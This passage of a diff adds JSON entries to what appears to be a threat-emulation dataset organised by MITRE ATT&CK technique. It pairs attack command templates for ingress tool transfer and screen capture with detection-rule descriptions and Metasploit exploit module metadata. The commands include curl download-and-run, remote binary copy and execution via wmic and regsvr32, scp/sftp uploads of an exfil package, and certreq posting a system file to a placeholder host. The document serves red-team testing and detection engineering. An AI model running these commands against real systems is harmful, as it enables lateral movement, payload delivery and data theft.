+          "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}",
+          "cleanup": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE",
+          "cleanup": "del %TEMP%\\PrintBrm.zip >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A",
+          "cleanup": "del %TEMP%\\redcanary.cab >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A",
+          "cleanup": "del %TEMP%\\redcanary.cab >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
+          "cleanup": "del #{local_path} >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "wscript.exe \"#{vbscript_file}\"",
+          "cleanup": "del Atomic-License.txt >nul 2>&1"
+        },
+        {
+          "executor": "sh",
+          "command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}",
+          "cleanup": "rm #{payload_name}"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}",
+          "cleanup": "del #{destination_path} >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}",
+          "cleanup": "del %temp%\\Atomic-license.txt >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "mkdir \"c:\\Temp\"\ncd #{working_dir}\nGUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample #{target_file_url} #{target_file_sha256}\"",
+          "cleanup": "rmdir /s /q \"C:\\Temp\\Sample\" >nul 2>nul"
+        },
+        {
+          "executor": "sh",
+          "command": "nscurl -k \"#{remote_file}\" -o \"#{destination_path}\"",
+          "cleanup": "rm \"#{destination_path}\""
+        },
+        {
+          "executor": "powershell",
+          "command": "sqlcmd -i #{remote_url} -o #{local_file_path}",
+          "cleanup": "rm \"#{local_file_path}\" 2>$null | Out-Null"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576\necho y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}",
+          "cleanup": "del /f /q #{exfil_package}"
+        },
+        {
+          "executor": "powershell",
+          "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n\n# Attack command\nscp.exe #{local_path}\\#{file_name} #{username}@#{remote_host}:#{remote_path}",
+          "cleanup": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $filePath\""
+        },
+        {
+          "executor": "powershell",
+          "command": "scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n# Attack command\necho \"put #{local_path}\\#{file_name}\" | sftp #{username}@#{remote_host}:#{remote_path}",
+          "cleanup": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force\nWrite-Output \"File deleted: $filePath\""
+        },
+        {
+          "executor": "powershell",
+          "command": "sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "if (-not (Test-Path \"#{onedrive_path}\")) {\n    Write-Host \"OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue.\"\n    exit 1\n}\n\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force | Out-Null\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateRingSettingURLFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"ODSUUpdateXMLUrlFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateXMLUrlFromOC\" -Value \"#{remote_url}\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateOfficeConfigTimestamp\" -Value 99999999999 -Type QWord -Force\n\n# Run OneDrive Standalone Updater\n& \"#{onedrive_path}\"",
+          "cleanup": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$env:LOCALAPPDATA\\Microsoft\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json\" -Force -ErrorAction Ignore"
+        },
+        {
+          "executor": "bash",
+          "command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url}",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;",
+          "cleanup": "rm PowerShellCore.msi;"
+        },
+        {
+          "executor": "psh",
+          "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Password Protected ZIP File Opened (Suspicious Filenames)",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "Detects the extraction of password protected ZIP archives with suspicious file names. See the filename variable for more details on which file has been opened."
+        },
+        {
+          "title": "AppX Package Installation Attempts Via AppInstaller.EXE",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries made by \"AppInstaller.EXE\". The AppInstaller is the default handler for the \"ms-appinstaller\" URI. It attempts to load/install a package from the referenced URL"
+        },
+        {
+          "title": "Suspicious File Created by ArcSOC.exe",
+          "logsource": {
+            "category": "file_event",
+            "product": "windows"
+          },
+          "description": "Detects instances where the ArcGIS Server process ArcSOC.exe, which hosts REST services running on an ArcGIS\nserver, creates a file with suspicious file type, indicating that it may be an executable, script file,\nor otherwise unusual."
+        },
+        {
+          "title": "Potentially Suspicious File Creation by OpenEDR's ITSMService",
+          "logsource": {
+            "product": "windows",
+            "category": "file_event"
+          },
+          "description": "Detects the creation of potentially suspicious files by OpenEDR's ITSMService process.\nThe ITSMService is responsible for remote management operations and can create files on the system through the Process Explorer or file management features.\nWhile legitimate for IT operations, creation of executable or script files could indicate unauthorized file uploads, data staging, or malicious file deployment."
+        },
+        {
+          "title": "Suspicious Deno File Written from Remote Source",
+          "logsource": {
+            "category": "file_event",
+            "product": "windows"
+          },
+          "description": "Detects Deno writing a file from a direct HTTP(s) call and writing to the appdata folder or bringing it's own malicious DLL.\nThis behavior may indicate an attempt to execute remotely hosted, potentially malicious files through deno."
+        },
+        {
+          "title": "Suspicious Desktopimgdownldr Target File",
+          "logsource": {
+            "product": "windows",
+            "category": "file_event"
+          },
+          "description": "Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension"
+        },
+        {
+          "title": "Legitimate Application Writing Files In Uncommon Location",
+          "logsource": {
+            "product": "windows",
+            "category": "file_event"
+          },
+          "description": "Detects legitimate applications writing any type of file to uncommon or suspicious locations that are not typical for application data storage or execution.\nAdversaries may leverage legitimate applications (Living off the Land Binaries - LOLBins) to drop or download malicious files to uncommon locations on the system to evade detection by security solutions."
+        },
+        {
+          "title": "Uncommon Network Connection Initiated By Certutil.EXE",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a network connection initiated by the certutil.exe utility.\nAttackers can abuse the utility in order to download malware or additional payloads."
+        },
+        {
+          "title": "Suspicious Dropbox API Usage",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable that isn't dropbox but communicates with the Dropbox API"
+        },
+        {
+          "title": "Suspicious Non-Browser Network Communication With Telegram API",
+          "logsource": {
+            "product": "windows",
+            "category": "network_connection"
+          },
+          "description": "Detects an a non-browser process interacting with the Telegram API which could indicate use of a covert C2"
+        },
+        {
+          "title": "Network Connection Initiated By IMEWDBLD.EXE",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a network connection initiated by IMEWDBLD.EXE. This might indicate potential abuse of the utility as a LOLBIN in order to download arbitrary files or additional payloads."
+        },
+        {
+          "title": "Network Communication Initiated To File Sharing Domains From Process Located In Suspicious Folder",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects executables located in potentially suspicious directories initiating network connections towards file sharing domains."
+        },
+        {
+          "title": "Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a network connection initiated by programs or processes running from suspicious or uncommon files system locations."
+        },
+        {
+          "title": "Local Network Connection Initiated By Script Interpreter",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a script interpreter (Wscript/Cscript) initiating a local network connection to download or execute a script hosted on a shared folder."
+        },
+        {
+          "title": "Outbound Network Connection Initiated By Script Interpreter",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads."
+        },
+        {
+          "title": "PowerShell Download Via Net.WebClient - PowerShell Classic",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_classic_start"
+          },
+          "description": "Detects PowerShell download activity, via the .DownloadFile() or .DownloadString() methods of the Net.WebClient class.\nThis technique is often abused by attackers to download additional payloads."
+        },
+        {
+          "title": "Potential COM Objects Download Cradles Usage - PS Script",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Script Block Logging must be enable"
+          },
+          "description": "Detects usage of COM objects that can be abused to download files in PowerShell by CLSID"
+        },
+        {
+          "title": "File Download Via Bitsadmin",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of bitsadmin downloading a file"
+        },
+        {
+          "title": "Suspicious Download From File-Sharing Website Via Bitsadmin",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of bitsadmin downloading a file from a suspicious domain"
+        },
+        {
+          "title": "File With Suspicious Extension Downloaded Via Bitsadmin",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of bitsadmin downloading a file with a suspicious extension"
+        },
+        {
+          "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder"
+        },
+        {
+          "title": "Browser Execution In Headless Mode",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of Chromium based browser in headless mode"
+        },
+        {
+          "title": "File Download with Headless Browser",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files"
+        },
+        {
+          "title": "File Download From Browser Process Via Inline URL",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state."
+        },
+        {
+          "title": "File Download via CertOC.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects when a user downloads a file by using CertOC.exe"
+        },
+        {
+          "title": "File Download From IP Based URL Via CertOC.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects when a user downloads a file from an IP based URL using CertOC.exe"
+        },
+        {
+          "title": "Suspicious CertReq Command to Download",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious CertReq execution downloading a file.\nThis behavior is often used by attackers to download additional payloads or configuration files.\nCertreq is a built-in Windows utility used to request and retrieve certificates from a certification authority (CA). However, it can be abused by threat actors for malicious purposes."
+        },
+        {
+          "title": "Suspicious Download Via Certutil.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of certutil with certain flags that allow the utility to download files."
+        },
+        {
+          "title": "Suspicious File Downloaded From Direct IP Via Certutil.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of certutil with certain flags that allow the utility to download files from direct IPs."
+        },
+        {
+          "title": "Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of certutil with certain flags that allow the utility to download files from file-sharing websites."
+        },
+        {
+          "title": "Curl Download And Execute Combination",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later."
+        },
+        {
+          "title": "Command Line Execution with Suspicious URL and AppData Strings",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)"
+        },
+        {
+          "title": "Potential Download/Upload Activity Using Type Command",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects usage of the \"type\" command to download/upload data from WebDAV server"
+        },
+        {
+          "title": "Suspicious Curl.EXE Download",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file"
+        },
+        {
+          "title": "Remote File Download Via Desktopimgdownldr Utility",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil."
+        },
+        {
+          "title": "Suspicious Desktopimgdownldr Command",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet"
+        },
+        {
+          "title": "Remote File Download Via Findstr.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry."
+        },
+        {
+          "title": "Insensitive Subfolder Search Via Findstr.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands."
+        },
+        {
+          "title": "Finger.EXE Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of the \"finger.exe\" utility.\nFinger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\nDue to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating."
+        },
+        {
+          "title": "Arbitrary File Download Via GfxDownloadWrapper.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file."
+        },
+        {
+          "title": "File Download Using Notepad++ GUP Utility",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files."
+        },
+        {
+          "title": "File Download And Execution Via IEExec.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of the IEExec utility to download and execute files"
+        },
+        {
+          "title": "Import LDAP Data Interchange Format File Via Ldifde.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server."
+        },
+        {
+          "title": "Suspicious Diantz Download and Compress Into a CAB File",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Download and compress a remote file and store it in a cab file on local machine."
+        },
+        {
+          "title": "Suspicious Extrac32 Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Download or Copy file with Extrac32"
+        },
+        {
+          "title": "PrintBrm ZIP Creation of Extraction",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation."
+        },
+        {
+          "title": "Replace.exe Usage",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of Replace.exe which can be used to replace file with another file"
+        },
+        {
+          "title": "File Download Via Windows Defender MpCmpRun.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of Windows Defender MpCmdRun.EXE to download files"
+        },
+        {
+          "title": "MsiExec Web Install",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects suspicious msiexec process starts with web addresses as parameter"
+        },
+        {
+          "title": "PowerShell MSI Install via WindowsInstaller COM From Remote Location",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of PowerShell commands that attempt to install MSI packages via the\nWindows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.\nThis could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.\nAnd the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection."
+        },
+        {
+          "title": "Potential COM Objects Download Cradles Usage - Process Creation",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects usage of COM objects that can be abused to download files in PowerShell by CLSID"
+        },
+        {
+          "title": "Potential DLL File Download Via PowerShell Invoke-WebRequest",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest or Invoke-RestMethod cmdlets."
+        },
+        {
+          "title": "Suspicious Invoke-WebRequest Execution With DirectIP",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects calls to PowerShell with Invoke-WebRequest cmdlet using direct IP access"
+        },
+        {
+          "title": "Suspicious Invoke-WebRequest Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location"
+        },
+        {
+          "title": "PUA - Nimgrab Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the usage of nimgrab, a tool bundled with the Nim programming framework and used for downloading files."
+        },
+        {
+          "title": "Remote Access Tool - TacticalRMM Agent Registration to Potentially Attacker-Controlled Server",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects TacticalRMM agent installations where the --api, --auth, and related flags are used on the command line.\nThese parameters configure the agent to connect to a specific RMM server with authentication, client ID, and site ID.\nThis technique could indicate a threat actor attempting to register the agent with an attacker-controlled RMM infrastructure silently."
+        },
+        {
+          "title": "Scheduled Task Creation with Curl and PowerShell Execution Combo",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the creation of a scheduled task using schtasks.exe, potentially in combination with curl for downloading payloads and PowerShell for executing them.\nThis facilitates executing malicious payloads or connecting with C&C server persistently without dropping the malware sample on the host."
+        },
+        {
+          "title": "Suspicious Download from Office Domain",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents"
+        },
+        {
+          "title": "Lolbas OneDriveStandaloneUpdater.exe Proxy Download",
+          "logsource": {
+            "category": "registry_set",
+            "product": "windows"
+          },
+          "description": "Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any\nanomalous executables with suspicious arguments. The downloaded file will be in C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json"
+        }
+      ],
+      "metasploit_modules": [
+        {
+          "module_path": "exploits/windows/ftp/quickshare_traversal_write",
+          "module_type": "exploits",
+          "base_class": "Msf::Module",
+          "name": "QuickShare File Server 1.2.1 Directory Traversal Vulnerability",
+          "description": "This module exploits a vulnerability found in QuickShare File Server's FTP\n          service.  By supplying \"../\" in the file path, it is possible to trigger a\n          directory traversal flaw, allowing the attacker to read a file outside the\n          virtual directory.  By default, the \"Writable\" option is enabled during account\n          creation, therefore this makes it possible to create a file at an arbitrary\n          location, which leads to remote code execution.",
+          "authors": [
+            "modpr0be",
+            "sinn3r"
+          ],
+          "platform": [],
+          "arch": [],
+          "session_types": [],
+          "privileged": false,
+          "rank": "excellent",
+          "disclosure_date": "2011-02-03",
+          "default_target": 0,
+          "cves": [
+            "2011-10010"
+          ],
+          "urls": [
+            "http://www.quicksharehq.com/blog/quickshare-file-server-1-2-2-released.html",
+            "http://www.digital-echidna.org/2011/02/quickshare-file-share-1-2-1-directory-traversal-vulnerability/"
+          ],
+          "edb_ids": [
+            "16105"
+          ],
+          "msb_ids": [],
+          "osvdb_ids": [
+            "70776"
+          ],
+          "bid_ids": [],
+          "mitre_techniques": [
+            {
+              "id": "T1059",
+              "name": "Command And Scripting Interpreter"
+            },
+            {
+              "id": "T1068",
+              "name": "Exploitation For Privilege Escalation"
+            },
+            {
+              "id": "T1105",
+              "name": "Ingress Tool Transfer"
+            }
+          ],
+          "notes": {
+            "stability": [],
+            "side_effects": [],
+            "reliability": [],
+            "aka": []
+          },
+          "compat": null,
+          "options": [],
+          "advanced_options": [],
+          "commands": [
+            {
+              "executor": "msfconsole",
+              "command": "use exploits/windows/ftp/quickshare_traversal_write && run",
+              "cleanup": null
+            }
+          ],
+          "has_documentation": false,
+          "scenario_output": ""
+        },
+        {
+          "module_path": "exploits/windows/mysql/mysql_mof",
+          "module_type": "exploits",
+          "base_class": "Msf::Module",
+          "name": "Oracle MySQL for Microsoft Windows MOF Execution",
+          "description": "This module takes advantage of a file privilege misconfiguration problem\n          specifically against Windows MySQL servers (due to the use of a .mof file).\n          This may result in arbitrary code execution under the context of SYSTEM.\n          This module requires a valid MySQL account on the target machine.",
+          "authors": [
+            "kingcope",
+            "sinn3r"
+          ],
+          "platform": [],
+          "arch": [],
+          "session_types": [],
+          "privileged": null,
+          "rank": "excellent",
+          "disclosure_date": "2012-12-01",
+          "default_target": 0,
+          "cves": [
+            "2012-5613"
+          ],
+          "urls": [
+            "https://seclists.org/fulldisclosure/2012/Dec/13"
+          ],
+          "edb_ids": [
+            "23083"
+          ],
+          "msb_ids": [],
+          "osvdb_ids": [
+            "88118"
+          ],
+          "bid_ids": [],
+          "mitre_techniques": [
+            {
+              "id": "T1059",
+              "name": "Command And Scripting Interpreter"
+            },
+            {
+              "id": "T1068",
+              "name": "Exploitation For Privilege Escalation"
+            },
+            {
+              "id": "T1078",
+              "name": "Valid Accounts"
+            },
+            {
+              "id": "T1105",
+              "name": "Ingress Tool Transfer"
+            }
+          ],
+          "notes": {
+            "stability": [],
+            "side_effects": [],
+            "reliability": [],
+            "aka": []
+          },
+          "compat": null,
+          "options": [],
+          "advanced_options": [],
+          "commands": [
+            {
+              "executor": "msfconsole",
+              "command": "use exploits/windows/mysql/mysql_mof && run",
+              "cleanup": null
+            }
+          ],
+          "has_documentation": false,
+          "scenario_output": ""
+        }
+      ]
+    },
+    {
+      "technique_id": "T1113",
+      "name": "Screen Capture",
+      "description": "Use screencapture command to collect a full desktop screenshot",
+      "platforms": [
+        "macos",
+        "linux",
+        "windows",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "bash",
+          "command": "screencapture #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "bash",
+          "command": "screencapture -x #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "bash",
+          "command": "xwd -root -out #{output_file}\nxwud -in #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "bash",
+          "command": "import -window root #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "powershell",
+          "command": "cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout #{recording_time} > NULL && psr.exe /stop\"",
+          "cleanup": "rm #{output_file} -ErrorAction Ignore"
+        },
+        {
+          "executor": "powershell",
+          "command": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")",
+          "cleanup": "Remove-Item #{output_file} -ErrorAction Ignore"
+        },
+        {
+          "executor": "powershell",
+          "command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f",
+          "cleanup": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f"
+        },
+        {
+          "executor": "powershell",
